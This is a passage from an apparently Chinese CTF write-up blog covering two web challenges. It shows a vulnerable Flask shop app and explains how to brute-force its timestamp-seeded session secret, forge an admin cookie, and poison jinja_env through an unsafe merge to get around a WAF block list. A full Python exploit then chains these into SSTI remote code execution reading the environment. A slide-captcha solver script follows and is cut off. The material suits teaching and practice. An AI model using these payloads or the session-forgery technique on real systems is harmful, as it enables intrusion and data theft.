class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> u <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">if</span> u.username == username:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;profile.html&#x27;</span>, user=u)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    identity = session.get(<span class="string">&#x27;identity&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> identity != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;message.html&#x27;</span>,</span><br><span class="line">                               <span class="built_in">type</span>=<span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">                               title=<span class="string">&#x27;访问被拒绝&#x27;</span>,</span><br><span class="line">                               message=<span class="string">&#x27;需要管理员权限&#x27;</span>,</span><br><span class="line">                               back_url=url_for(<span class="string">&#x27;index&#x27;</span>),</span><br><span class="line">                               back_text=<span class="string">&#x27;返回首页&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    admin = Admin()</span><br><span class="line">    merge(session, admin)</span><br><span class="line">    admin_obj.append(admin)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, products=<span class="built_in">enumerate</span>(products), users=users)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== 初始化 ====================</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_data</span>():</span><br><span class="line">    admin_user = User(username=<span class="string">&#x27;admin&#x27;</span>, password=<span class="string">&#x27;xxxxxx&#x27;</span>)<span class="comment">#不要爆破！！！</span></span><br><span class="line">    admin_user.is_admin = <span class="literal">True</span></span><br><span class="line">    admin_user.balance = <span class="number">0</span></span><br><span class="line">    users.append(admin_user)</span><br><span class="line"></span><br><span class="line">    flag_product = Product(name=<span class="string">&#x27;FLAG&#x27;</span>, price=<span class="number">1.0</span>, stock=<span class="number">0</span>)</span><br><span class="line">    flag_product.is_flag = <span class="literal">True</span></span><br><span class="line">    products.append(flag_product)</span><br><span class="line"></span><br><span class="line">    products.append(Product(name=<span class="string">&#x27;iPhone&#x27;</span>, price=<span class="number">999</span>, stock=<span class="number">10</span>, owner=<span class="string">&#x27;admin&#x27;</span>))</span><br><span class="line">    products.append(Product(name=<span class="string">&#x27;MacBook&#x27;</span>, price=<span class="number">1999</span>, stock=<span class="number">5</span>, owner=<span class="string">&#x27;admin&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] 系统初始化完成&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    init_data()</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>很明显的<code>merge(src, dst)函数</code>，肯定是要打原型链污染了</p>
+<p><code>rendered_flag = render_template_string(...)</code>可以打SSTI</p>
+<p>有WAF</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forbidden=[<span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__globals__&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;і&#x27;</span>, <span class="string">&#x27;а&#x27;</span>, <span class="string">&#x27;е&#x27;</span>, <span class="string">&#x27;о&#x27;</span>, <span class="string">&#x27;р&#x27;</span>, <span class="string">&#x27;с&#x27;</span>, <span class="string">&#x27;х&#x27;</span>, <span class="string">&#x27;у&#x27;</span>, <span class="string">&#x27;І&#x27;</span>, <span class="string">&#x27;А&#x27;</span>, <span class="string">&#x27;Е&#x27;</span>, <span class="string">&#x27;О&#x27;</span>, <span class="string">&#x27;Р&#x27;</span>, <span class="string">&#x27;С&#x27;</span>, <span class="string">&#x27;Х&#x27;</span>, <span class="string">&#x27;У&#x27;</span>,<span class="string">&#x27;static&#x27;</span>]</span><br></pre></td></tr></table></figure></div>
+
+<p>在<code>/products/&lt;int:product_id&gt;/update</code>路由中有调用<code>merge(data, target)</code>，但是需要验证admin权限</p>
+<p>而secret_key采用的 <code>int(time.time())</code> 这种超弱方式生成的，只跟容器启动时的时间戳有关，直接枚举种子(时间戳)即可</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">random.seed(int(time.time()))</span><br><span class="line">secret_key = &#x27;&#x27;.join(random.choices(&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;, k=32))</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = secret_key</span><br></pre></td></tr></table></figure></div>
+
+<p>随便注册一个账号，得到seesion，枚举得到</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] hit: 1763174068 SGiN82tIoZAxH8SF7DuFSuzwzDp0A08r &#123;&#x27;identity&#x27;: &#x27;guest&#x27;, &#x27;username&#x27;: &#x27;aaa&#x27;&#125;</span><br><span class="line">admin_cookie: eyJ1c2VybmFtZSI6ImFkbWluIiwiaWRlbnRpdHkiOiJhZG1pbiJ9.aRfn4A.ytK2OjbDQM231U-s89F0gunBdMM</span><br></pre></td></tr></table></figure></div>
+
+<p>伪造admin将<code>is_flag</code>设置为<code>true</code>，<code>stock</code>设置为1</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115104521248.png"
+                      alt="image-20251115104521248"
+                ></p>
+<p>进行购买，得到是是假flag，也就是说<code>app.flag_content = &quot;xxxx&quot;</code>并不是真的flag，需要SSTI进行RCE</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115104539134.png"
+                      alt="image-20251115104539134"
+                ></p>
+<p>可以通过<code>jinja_env</code>的设置绕过<code>&#123; 和 &#125;</code></p>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;product&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;price&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;stock&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;app&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;jinja_env&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;variable_start_string&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;&lt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;variable_end_string&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;&gt;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;flag_content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;&lt; 7 * 7 &gt;&gt;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>利用 Jinja 的 <code>attr</code> 过滤器 + 字符串拼接绕过，Jinja 有内置过滤器 <code>attr</code>，作用类似 Python 的 <code>getattr</code>：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">obj|attr(&quot;name&quot;)  ≈  getattr(obj, &quot;name&quot;)</span><br><span class="line"></span><br><span class="line">(config.from_envvar | attr(&#x27;__glo&#x27; ~ &#x27;bals__&#x27;))[&#x27;os&#x27;].popen(&#x27;env&#x27;).read()</span><br></pre></td></tr></table></figure></div>
+
+<p>逐步解释：</p>
+<ol>
+<li><code>config.from_envvar</code>：拿到 <code>Config.from_envvar</code> 这个方法</li>
+<li><code>| attr(&#39;__glo&#39; ~ &#39;bals__&#39;)</code>：<ul>
+<li><code>&#39;__glo&#39; ~ &#39;bals__&#39;</code> 在模板执行时变成 <code>&#39;__globals__&#39;</code></li>
+<li><code>attr(&#39;__globals__&#39;)</code> 就是 <code>getattr(config.from_envvar, &#39;__globals__&#39;)</code></li>
+<li>得到的是 function 的 <code>__globals__</code> 字典</li>
+</ul>
+</li>
+</ol>
+<p>最终 RCE Payload 组合，在<code>/products/0/update</code>路由中完成</p>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;product&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;price&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;stock&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;app&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;jinja_env&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;variable_start_string&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;&lt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;variable_end_string&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;&gt;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;flag_content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;&lt; (config.from_envvar | attr(&#x27;__glo&#x27; ~ &#x27;bals__&#x27;))[&#x27;os&#x27;].popen(&#x27;env&#x27;).read() &gt;&gt;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>访问<code>/products/0/buy</code>路由进行渲染</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /products/0/buy</span><br><span class="line">Cookie: session=&lt;你伪造的admin session&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time, random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">chars = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_secret</span>(<span class="params">ts</span>):</span><br><span class="line">    random.seed(ts)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choices(chars, k=<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从目标拿到一个合法 session cookie（比如访问 / 后浏览器里的那个）</span></span><br><span class="line">known_cookie = <span class="string">&quot;eyJpZGVudGl0eSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJhYWEifQ.aRfnIg.G2Xk4FWJk59di4ahOuSV0P09590&quot;</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">session_interface = SecureCookieSessionInterface()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_secret</span>(<span class="params">secret</span>):</span><br><span class="line">    app.secret_key = secret</span><br><span class="line">    s = session_interface.get_signing_serializer(app)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = s.loads(known_cookie)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, data  <span class="comment"># 能正常 loads 就说明 secret 对了</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">now = <span class="built_in">int</span>(time.time())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ts <span class="keyword">in</span> <span class="built_in">range</span>(now - <span class="number">86400</span>, now + <span class="number">1</span>):  <span class="comment"># 从 24 小时前枚举到现在（视题目情况调整窗口）</span></span><br><span class="line">    secret = gen_secret(ts)</span><br><span class="line">    ok, data = test_secret(secret)</span><br><span class="line">    <span class="keyword">if</span> ok:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] hit:&quot;</span>, ts, secret, data)</span><br><span class="line">        app = Flask(__name__)</span><br><span class="line">        app.secret_key = secret</span><br><span class="line">        s = session_interface.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">        admin_cookie = s.dumps(&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;identity&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;admin_cookie: &quot;</span> + admin_cookie)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># [+] hit: 1763174068 SGiN82tIoZAxH8SF7DuFSuzwzDp0A08r &#123;&#x27;identity&#x27;: &#x27;guest&#x27;, &#x27;username&#x27;: &#x27;aaa&#x27;&#125;</span></span><br><span class="line"><span class="comment"># admin_cookie: eyJ1c2VybmFtZSI6ImFkbWluIiwiaWRlbnRpdHkiOiJhZG1pbiJ9.aRfn4A.ytK2OjbDQM231U-s89F0gunBdMM</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE = <span class="string">&quot;http://47.98.117.93:44441&quot;</span>   <span class="comment"># 改成你题目的地址</span></span><br><span class="line">ADMIN_SESSION = <span class="string">&quot;eyJ1c2VybmFtZSI6ImFkbWluIiwiaWRlbnRpdHkiOiJhZG1pbiJ9.aRfn4A.ytK2OjbDQM231U-s89F0gunBdMM&quot;</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">s.cookies.<span class="built_in">set</span>(<span class="string">&quot;session&quot;</span>, ADMIN_SESSION)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">step1_test_ssti</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    先用 7*7 测试一下 SSTI 是否成功</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;product&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;price&quot;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;stock&quot;</span>: <span class="number">1</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;app&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;jinja_env&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;variable_start_string&quot;</span>: <span class="string">&quot;&lt;&lt;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;variable_end_string&quot;</span>: <span class="string">&quot;&gt;&gt;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;flag_content&quot;</span>: <span class="string">&quot;&lt;&lt; 7 * 7 &gt;&gt;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    r = s.post(<span class="string">f&quot;<span class="subst">&#123;BASE&#125;</span>/products/0/update&quot;</span>, json=payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] update resp:&quot;</span>, r.text[:<span class="number">200</span>])</span><br><span class="line"></span><br><span class="line">    r2 = s.post(<span class="string">f&quot;<span class="subst">&#123;BASE&#125;</span>/products/0/buy&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] buy resp (should contain 49):&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r2.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">step2_rce_flag</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    真正 RCE 读 /flag</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;product&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;price&quot;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;stock&quot;</span>: <span class="number">1</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;app&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;jinja_env&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;variable_start_string&quot;</span>: <span class="string">&quot;&lt;&lt;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;variable_end_string&quot;</span>: <span class="string">&quot;&gt;&gt;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;flag_content&quot;</span>: <span class="string">&quot;&lt;&lt; (config.from_envvar | attr(&#x27;__glo&#x27; ~ &#x27;bals__&#x27;))[&#x27;os&#x27;].popen(&#x27;env&#x27;).read() &gt;&gt;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    r = s.post(<span class="string">f&quot;<span class="subst">&#123;BASE&#125;</span>/products/0/update&quot;</span>, json=payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] update resp:&quot;</span>, r.text[:<span class="number">200</span>])</span><br><span class="line"></span><br><span class="line">    r2 = s.post(<span class="string">f&quot;<span class="subst">&#123;BASE&#125;</span>/products/0/buy&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] buy resp (look for real flag):&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r2.text)</span><br><span class="line"></span><br><span class="line">step1_test_ssti()</span><br><span class="line"><span class="comment"># 确认返回页面里有 49 后，再执行：</span></span><br><span class="line">step2_rce_flag()</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115112908322.png"
+                      alt="image-20251115112908322"
+                ></p>
+<h2 id="Slide-Captcha"><a href="#Slide-Captcha" class="headerlink" title="Slide Captcha"></a>Slide Captcha</h2><p>描述</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">听说你很喜欢破解滑动验证码，来试试这个，只要滑动10次就可以获得flag</span><br><span class="line">本题目取材自真实环境中滑动验证码绕过思路，Hacked have fun~</span><br></pre></td></tr></table></figure></div>
+
+<p>其实思路挺简单的，得到验证码图片后，直接本地爆破滑动验证码位置，正确后再在靶机上发送就行</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115115409942.png"
+                      alt="image-20251115115409942"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115115446606.png"
+                      alt="image-20251115115446606"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115115436083.png"
+                      alt="image-20251115115436083"
+                ></p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line">BASE = <span class="string">&quot;http://47.98.117.93:59963&quot;</span></span><br><span class="line">GOAL = <span class="number">10</span>  <span class="comment"># 需要连续通过 10 次</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64_to_cv2</span>(<span class="params">b64_str: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将 swagger 返回的 base64 图片转成 OpenCV 的 ndarray</span></span><br><span class="line"><span class="string">    支持 data:image/png;base64,xxxx 这种前缀</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> b64_str.startswith(<span class="string">&quot;data:&quot;</span>):</span><br><span class="line">        b64_str = b64_str.split(<span class="string">&quot;,&quot;</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">    data = base64.b64decode(b64_str)</span><br><span class="line">    arr = np.frombuffer(data, np.uint8)</span><br><span class="line">    img = cv2.imdecode(arr, cv2.IMREAD_COLOR)</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_captcha</span>(<span class="params">session: requests.Session</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    从靶机获取一个新的验证码 JSON</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    r = session.get(<span class="string">f&quot;<span class="subst">&#123;BASE&#125;</span>/captcha&quot;</span>)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    j = r.json()</span><br><span class="line">    <span class="keyword">return</span> j</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">local_solve_x_pos</span>(<span class="params">captcha_json: <span class="built_in">dict</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    本地“爆破”求 